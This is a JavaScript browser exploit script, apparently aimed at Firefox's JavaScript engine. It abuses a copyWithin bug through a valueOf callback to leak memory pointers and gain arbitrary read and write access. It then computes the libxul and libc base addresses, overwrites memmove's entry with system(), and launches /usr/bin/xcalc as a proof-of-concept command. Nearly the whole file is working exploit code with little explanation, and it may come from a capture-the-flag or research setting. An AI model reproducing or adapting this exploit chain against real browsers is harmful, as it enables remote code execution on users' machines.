function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

function print(msg) {
    console.log(msg);
    document.body.innerText += msg + '\n';
}

//
// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this == other
    this.equals = operation(function(other) {
        for (var i = 0; i < 8; i++) {
            if (this.byteAt(i) != other.byteAt(i))
                return false;
        }
        return true;
    }, 1);

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a << 1
    this.assignLShift1 = operation(function lshift1(a) {
        var highBit = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i);
            bytes[i] = (cur << 1) | highBit;
            highBit = (cur & 0x80) >> 7;
        }
        return this;
    }, 1);

    // this = a >> 1
    this.assignRShift1 = operation(function rshift1(a) {
        var lowBit = 0;
        for (var i = 7; i >= 0; i--) {
            var cur = a.byteAt(i);
            bytes[i] = (cur >> 1) | lowBit;
            lowBit = (cur & 0x1) << 7;
        }
        return this;
    }, 1);

    // this = a & b
    this.assignAnd = operation(function and(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) & b.byteAt(i);
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromJSValue = function(bytes) {
    bytes[7] = 0;
    bytes[6] = 0;
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return ~n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

function LShift1(a) {
    return (new Int64()).assignLShift1(a);
}

function RShift1(a) {
    return (new Int64()).assignRShift1(a);
}

function And(a, b) {
    return (new Int64()).assignAnd(a, b);
}

function Equals(a, b) {
    return a.equals(b);
}



var buffers = [];
for (var i = 0; i < 100; i++) {
    buffers.push(new ArrayBuffer(96));
}

var new_view = new Uint8Array(buffers[79]); // new_view is our TypedArray

new_view[0] = 0x41
new_view[1] = 0x42
new_view[2] = 0x41
new_view[3] = 0x42
new_view[4] = 0x41
new_view[5] = 0x42
new_view[6] = 0x41
new_view[7] = 0x42
new_view[8] = 0x49
new_view[9] = 0x4a
new_view[10] = 0x4b
new_view[11] = 0x4c
new_view[12] = 0x4d
buffers[80].foo = Date.now;

var hax = { valueOf: function() { new_view.offset = 72; return 0; } };

// // Trigger the bug first time to leak the data pointer of the following ArrayBuffer
new_view.copyWithin(hax, 32+8, 40+8+16);

var leak = new Uint32Array(buffers[79]);
var leak_slots = leak[19]* 4294967296 + leak[18];
var leak_element = leak[21]* 4294967296 + leak[20];
var leak_data_ptr = leak[23]* 4294967296 + leak[22];
console.log(leak_slots.toString(16));
console.log(leak_element.toString(16));
console.log(leak_data_ptr.toString(16));




// var new_view2 = new Uint8Array(buffers[81]); // new_view is our TypedArray

// var x = new Int64(RShift1((leak_data_ptr << 1));
var x = new Int64(RShift1(Add(LShift1(leak_data_ptr),0x80)))
console.log(x)
new_view[0] = x.byteAt(0);
new_view[1] = x.byteAt(1);
new_view[2] = x.byteAt(2);
new_view[3] = x.byteAt(3);
new_view[4] = x.byteAt(4);
new_view[5] = x.byteAt(5);
new_view[6] = x.byteAt(6);
new_view[7] = x.byteAt(7);


// // Trigger the bug first time to leak the data pointer of the following ArrayBuffer
// new_view.copyWithin(40, hax, 8);

var new_view2 = new Uint8Array(buffers[79]);
var hax2 = { valueOf: function() { new_view2.offset = 72; return 0; } };

new_view2.copyWithin(128-72, hax2,8)

var x1= new Int64(RShift1(leak_slots))


var arr1 =new Uint8Array(buffers[80]);
arr1[0] = x1.byteAt(0);
arr1[1] = x1.byteAt(1);
arr1[2] = x1.byteAt(2);
arr1[3] = x1.byteAt(3);
arr1[4] = x1.byteAt(4);
arr1[5] = x1.byteAt(5);
arr1[6] = x1.byteAt(6);
arr1[7] = x1.byteAt(7);

var arr2 = new Uint8Array(buffers[81])

var leak_fp =0;
for(var i = 0; i<6;i++)
{
	leak_fp += (arr2[i] * Math.pow(0x100,i))
}

console.log(leak_fp.toString(16));
var x2 = new Int64(RShift1(leak_fp));
arr1[0] = x2.byteAt(0);
arr1[1] = x2.byteAt(1);
arr1[2] = x2.byteAt(2);
arr1[3] = x2.byteAt(3);
arr1[4] = x2.byteAt(4);
arr1[5] = x2.byteAt(5);
arr1[6] = x2.byteAt(6);
arr1[7] = x2.byteAt(7)

var leak_date_now =0;
var arr3 = new Uint8Array(buffers[81])
for(var i = 0; i<6;i++)
{
	leak_date_now += (arr3[0x28+i] * Math.pow(0x100,i))
}
console.log(leak_date_now.toString(16))

libxul_base = leak_date_now - 0x2f30560;
console.log(libxul_base.toString(16))
memove = libxul_base + 0x4b1e160;
console.log(memove.toString(16))

var x2 = new Int64(RShift1(memove));
arr1[0] = x2.byteAt(0);
arr1[1] = x2.byteAt(1);
arr1[2] = x2.byteAt(2);
arr1[3] = x2.byteAt(3);
arr1[4] = x2.byteAt(4);
arr1[5] = x2.byteAt(5);
arr1[6] = x2.byteAt(6);
arr1[7] = x2.byteAt(7);

var libc_memove=0;
var arr4 = new Uint8Array(buffers[81])
for(var i = 0; i<6;i++)
{
	libc_memove += (arr4[i] * Math.pow(0x100,i))
}
console.log(libc_memove.toString(16))
libc_base = libc_memove - 0x18ead0;
console.log(libc_base.toString(16));
libc_system = libc_base + 0x4f440;


var target = new Uint8Array(100);
var cmd = "/usr/bin/xcalc"

for (var i = 0; i < cmd.length; i++) {
            target[i] = cmd.charCodeAt(i);
        }

target[cmd.length] = 0;

var x2 = new Int64(RShift1(memove));
arr1[0] = x2.byteAt(0);
arr1[1] = x2.byteAt(1);
arr1[2] = x2.byteAt(2);
arr1[3] = x2.byteAt(3);
arr1[4] = x2.byteAt(4);
arr1[5] = x2.byteAt(5);
arr1[6] = x2.byteAt(6);
arr1[7] = x2.byteAt(7);


var arr5 = new Uint8Array(buffers[81])
var x6 = new Int64(libc_system);
arr5[0] = x6.byteAt(0);
arr5[1] = x6.byteAt(1);
arr5[2] = x6.byteAt(2);
arr5[3] = x6.byteAt(3);
arr5[4] = x6.byteAt(4);
arr5[5] = x6.byteAt(5);
arr5[6] = x6.byteAt(6);
arr5[7] = x6.byteAt(7);


target.copyWithin(0, 1);
